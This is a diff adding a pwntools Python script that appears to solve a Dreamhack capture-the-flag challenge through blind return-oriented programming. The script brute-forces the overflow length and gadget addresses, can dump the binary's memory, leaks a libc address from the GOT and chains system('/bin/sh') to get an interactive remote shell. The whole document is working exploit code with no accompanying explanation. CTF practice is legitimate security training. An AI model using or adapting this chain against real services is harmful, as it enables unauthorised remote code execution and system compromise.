@@ -1,0 +1,208 @@
+from pwn import *
+
+HOST = "host1.dreamhack.games"
+PORT = 10710
+
+
+codebase = 0x400000 # NO PIE
+
+
+def find_stack_size():
+    i = 1
+    try:
+        while True:
+            p = remote(HOST, PORT)
+            p.sendlineafter("> ", "1")
+            payload = b"A" * i
+            p.sendafter("\n", payload)
+            log.info(str(i) + " "+ p.recv().decode())
+            p.close()
+            i += 1
+
+    except:
+        log.info("find it!")
+        return i - 1 
+
+
+        
+def find_stop_gadget(stack_size):
+    i = 1
+    
+    while True:
+        try:
+            p = remote(HOST, PORT)
+            p.sendlineafter("> ", "1")
+            sleep(0.5)
+            payload  = b"A" * stack_size
+            payload += p64(codebase + i)
+            p.sendafter("\n", payload)
+            sleep(0.5)
+            res = p.recv()
+            p.close()
+            if b"Hope" in res:
+                log.info("find it!")
+                return codebase + i
+            i += 1
+        except:
+            p.close()
+            i += 1
+
+
+
+
+
+def find_brop_gadget(stack_size, stop_gadget):
+    i = 1
+    
+    while True:
+        try:
+            p = remote(HOST, PORT)
+            p.sendlineafter("> ", "1")
+            sleep(0.5)
+            payload  = b"A" * stack_size
+            payload += p64(codebase + i)
+            payload += p64(0) * 6
+            payload += p64(stop_gadget)
+            p.sendafter("\n", payload)
+            sleep(0.5)
+            res = p.recv()
+            log.info(res)
+            p.close()
+
+            if b'Hope' in res:
+
+                # double check
+                try:
+                    p = remote(HOST, PORT)
+                    p.sendlineafter("> ", "1")
+                    sleep(0.5)
+                    payload  = b"A" * stack_size
+                    payload += p64(codebase + i)
+                    payload += p64(0) * 7 #
+                    p.sendafter("\n", payload)
+                    sleep(0.5)
+                    res = p.recv()
+                    log.info(res)
+                    p.close()
+                except:
+                    log.info("find it!")
+                    return codebase + i
+
+
+               
+            i += 1
+        except:
+            log.info("except")
+            p.close()
+            i += 1
+    
+def find_puts_plt(stack_size, stop_gadget, brop_gadget):
+
+    i = 1
+    
+    while True:
+        try:
+            p = remote(HOST, PORT)
+            p.sendlineafter("> ", "1")
+            sleep(0.5)
+            payload  = b"A" * stack_size
+            payload += p64(brop_gadget+9)
+            payload += p64(codebase)
+            payload += p64(codebase + i)
+            p.sendlineafter("\n", payload)
+            res = p.recv()
+            print(res)
+            if b"\x7fELF" in res:
+                log.info("find it")
+                return codebase + i
+            i += 1
+        except:
+            p.close()
+            i += 1
+
+
+
+
+def memory_dump(size, stop, pop_rdi, puts_plt):
+    dump = ''
+    offset = 0
+    p = remote(HOST,PORT)
+    while offset<15007:
+        if offset == 0:
+            p.sendlineafter("> ",'1')
+        else:
+            p.sendline('1')
+
+        payload = 'A'*size
+        payload += p64(pop_rdi)
+        payload += p64(codebase+offset)
+        payload += p64(puts_plt)
+        payload += p64(stop)
+        print(offset)
+        p.send(payload)
+        p.recvline()
+        try:
+            data = p.recv(timeout = 1)
+            data = data[:data.index('\n\xf0\x9f\x93\xac  Hope')]
+            print(data,len(data))
+        except ValueError as e:
+            pass
+        if len(data) == 0:
+            data = '\x00'
+
+        offset += len(data)
+        dump += data
+
+    with open('memory.dump','wb') as f:
+        f.write(dump)
+
+    log.info("finish")
+    p.close()
+
+
+
+
+stack_size = 264 #find_stack_size()
+stop_gadget = 0x401126 #find_stop_gadget(stack_size)
+brop_gadget = 0x40146a #find_brop_gadget(stack_size, stop_gadget)
+puts_plt = 0x4010b0 #find_puts_plt(stack_size, stop_gadget, brop_gadget)
+
+# memory_dump(stack_size, stop_gadget, brop_gadget + 9, puts_plt) 
+
+puts_got = 0x404018
+main = 0x401391
+
+# ROP
+payload  = ""
+payload += "a" * stack_size
+payload += p64(brop_gadget + 9)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+p = remote(HOST,PORT)
+p.sendlineafter("> ",'1')
+sleep(0.5)
+p.sendafter("\n", payload)
+libc = u64(p.recvuntil('\x7f').ljust(8, "\x00"))
+print(hex(libc))
+# print(hex(u64(p.recv(8).ljust(8, "\x00"))))
+
+
+
+system = libc + 0x04fa60 - 0x0809d0
+binsh = libc + 0x1abf05 - 0x0809d0
+
+payload  = ""
+payload += "a" * stack_size
+payload += p64(brop_gadget + 10)
+payload += p64(brop_gadget + 9)
+payload += p64(binsh)
+payload += p64(system)
+payload += p64(main)
+
+p.sendlineafter("> ",'1')
+p.sendafter("\n", payload)
+
+
+p.interactive()
